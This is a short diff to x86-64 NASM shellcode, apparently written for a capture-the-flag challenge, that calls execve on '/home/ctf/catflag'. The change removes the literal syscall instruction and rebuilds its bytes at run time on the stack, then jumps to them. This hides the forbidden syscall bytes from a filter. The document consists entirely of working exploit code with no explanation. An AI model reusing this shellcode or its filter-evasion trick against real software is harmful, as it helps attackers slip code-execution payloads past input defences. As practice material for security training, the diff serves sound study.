@@ -1,4 +1,3 @@
-; this needs to be compiled with nasm
 section .text
 global _start
 _start:
@@ -9,7 +8,10 @@ shellcode:
     add eax, 0x3b
     xor esi, esi
     xor edx, edx
-    syscall
+    mov rcx, 0x909090909090050e
+    add rcx, 0x0000000000000001
+    push rcx
+    jmp rsp
 binsh:
-	call shellcode
-	db "/home/ctf/catflag"
+    call shellcode
+    db "/home/ctf/catflag"
